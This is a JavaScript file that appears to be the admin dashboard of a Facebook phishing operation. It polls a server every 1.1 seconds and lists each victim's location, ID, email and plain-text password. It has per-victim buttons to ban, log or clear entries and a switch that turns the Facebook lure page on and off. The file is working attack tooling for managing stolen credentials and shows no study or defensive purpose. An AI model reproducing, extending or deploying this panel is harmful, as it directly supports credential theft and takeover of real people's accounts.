
var data=[];
var uc=[];
var data1;
var data2 = []
var apis = true
  var but1 =document.getElementById('b1');
  var but2 =document.getElementById('b2');
  var but3 =document.getElementById('b3');
  let inte = setInterval(function(){
    if (apis == true) {
  //console.clear()
let api = new XMLHttpRequest()
   api.open('POST','https://'+location.host+ '/api')
   api.setRequestHeader("Accept","application/json")
   api.setRequestHeader("Content-Type","application/json")
   api.onreadystatechange=function(){
     if (api.readyState == 4){
      //console.log(JSON.parse(api.responseText))
          var de = JSON.stringify(data)
          var da = JSON.stringify(JSON.parse(api.responseText))
            if (de != da) {
              data = JSON.parse(api.responseText).data
              uc = JSON.parse(api.responseText).uc
              refrih()
            }
          
          
          //console.log(data) 
       if (data[0] == undefined) {
        but1.style=`
    background: red;
    height: 50px;
    width: auto;
    margin: 5px 20px 0 20px;
    border-radius: 10px;
    font-size: 30px;
    padding:  0 15px 0 15px;
        `
        document.getElementById('div').innerHTML=`
        <div class="uesr"><h1>LODING</h1><div class="it">لا يوجد بينات</div></div>
      
      `
       }else{
        but1.style=`
    background: rgb(0, 176, 12);
    height: 50px;
    width: auto;
    margin: 5px 20px 0 20px;
    border-radius: 10px;
    font-size: 30px;
    padding:  0 15px 0 15px;
    `
       }
     }
   }
   api.send()
   let apit = new XMLHttpRequest()
   apit.open('POST','https://'+location.host+'/online/test')
   apit.setRequestHeader("Accept","application/json")
   apit.setRequestHeader("Content-Type","application/json")
   apit.onreadystatechange=function(){
     if (apit.readyState == 4){
       if (JSON.stringify(data1) != apit.responseText) {
         data1 = JSON.parse(apit.responseText)
         //console.log(data1)
      }
      

       if (data1.FACBOOK == true) {
        document.getElementById('ledF').style=`
        position: absolute;
        width: 20px;
        height: 20px; 
        border-radius: 50%;
        background: green;
        transform: translate(155px , -25px);
        transition: 300ms;
        `
       }else{
        document.getElementById('ledF').style=`
        position: absolute;
        width: 20px;
        height: 20px;
        border-radius: 50%;
        background: red;
        transform: translate(155px , -25px);
        transition: 300ms;
        `
       }
      }
   }
  
   apit.send()
    }
  },1100)
  //---------------------------------------------------------------->
  function refrih(){
    document.getElementById('div').innerHTML=''
    var afer
    for (let z = 0; z < data.length ; z++) {
      var af; 
      if (data[z].AFER == undefined) {
        af = false
        var cTF
      }else{ af = "TR"}
      if (data[z].AFER == "undefined") {
        afer = ''
        cTF = false
      }else{
        afer = data[z].AFER
        cTF = true
      }
      var ldtf = "true"
      for (let e = 0; e < uc.length; e++) {
        if (data[z].ID == uc[e]) {
          ldtf = "false"
        }
      }
        
      //console.log(ldtf)
      document.getElementById('div').innerHTML+=`
      <div class="uesr">
      <div class="yiu">
      <h1>|Location : ${data[z].Location}</h1>
      <h1>|ID : ${data[z].ID}</h1>
      <h1>|BANE : ${data[z].BANE}</h1>
      <h1>|LOG : ${data[z].IA}</h1>
      </div>
      <div class="rus"><h2>EMAIL : ${data[z].Email}</h2></div>
      <div class="rus"><h2>PASSWORD : ${data[z].Password}</h2></div>
      <div class="btts">
      <input type="button" class="${data[z].BANE}" id="B${data[z].ID}" onclick="RST(this.id)" value="BANE">
      <input type="button" class="${data[z].IA}" id="L${data[z].ID}" onclick="RST(this.id)" value="LOG">
      <input type="button" class="true" id="D${data[z].ID}" onclick="RST(this.id)" value="CLEAR">
      <h1 class="c${cTF}">${afer}</h1>
      <div class="i${ldtf}"></div>
      </div>
      </div> 
      
      `
    }
  }
  var ST = 'STOP'
  var MPM;
document.getElementById('b1').value='DELIT ALL'
document.getElementById('b2').value='STOP'
document.getElementById('b3').value='FACBOOK STOP'
  

  but2.onclick=function(){
    if (but2.value == 'STOP') {
      apis = false
      but2.value = 'NEXT'
      but2.style=`
    background: red;
    height: 50px;
    width: auto;
    margin: 5px 20px 0 10px;
    border-radius: 10px;
    font-size: 30px;
    transition: 500ms;
    padding:  0 15px 0 15px;
      `
      document.getElementById('ledF').style=`
        position: absolute;
        width: 20px;
        height: 20px;
        border-radius: 50%;
        background: red;
        transform: translate(155px , -25px);
        transition: 300ms;
        `

    }else{
      apis = true
      but2.value = 'STOP'
      but2.style=`
    background: rgb(0, 176, 12);
    height: 50px;
    width: auto;
    margin: 5px 20px 0 10px;
    border-radius: 10px;
    font-size: 30px;
    transition: 500ms;
    padding:  0 15px 0 15px;
    `
    }
  }
  var oa = 'O'
  but1.onclick=function(){pram('C',undefined)}
  but3.onclick=function(){
      pram('FA','')
      //console.log(oa)
    }
    

  function pram(Q,D) {
    let api = new XMLHttpRequest()
   api.open('POST','https://'+location.host+'/DS')
   api.setRequestHeader("Accept","application/json")
   api.setRequestHeader("Content-Type","application/json")
   api.onreadystatechange=function(){
     if (api.readyState == 4){
       var data2 = JSON.parse(api.responseText).data

if (data2 == '//FACBOOK//null.html') {
        oa = 'A'
    but3.style=`
    position: relative;
    background-color: red;
    top: 5px;
    margin:0 100px 0 0px;
    transition: 500ms;
        `
       }else{
    oa = 'O'
    but3.style=`
    position: relative;
    background-color: rgb(55, 115, 255);
    top: 5px;
    margin:0 100px 0 0px;
    transition: 500ms;
        `
       }

     }
   }
   //console.log(Q +'   '+D)
   var da =`{
     "I":"${Q}", 
    "data":"${D}"
  }`
   api.send(da)
  }

  pram('0',undefined)
  function RST(id) {
    var OD = ""
    OD = id
    var P = OD.slice(0,1)
    var N = OD.slice(1,id.length)
    pram(P,N)
  }
  console.log(location.host)


  /* */